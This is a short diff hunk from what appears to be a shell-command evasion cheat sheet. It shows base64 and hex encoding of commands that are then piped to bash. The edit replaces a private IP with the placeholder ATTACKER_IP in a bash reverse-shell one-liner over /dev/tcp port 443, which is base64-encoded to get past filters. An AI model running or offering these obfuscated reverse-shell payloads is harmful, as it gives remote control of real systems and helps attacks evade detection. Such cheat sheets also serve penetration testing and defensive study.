@@ -25,7 +25,7 @@ echo 'id' | base64
 # -> aWQ=
 echo aWQ= | base64 -d | bash
 # Complexer:
-echo 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1' | base64
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' | base64
 echo BASE64_HERE | base64 -d | bash
 # === Hex encoding bypass ===
 echo -e '\x69\x64' | bash
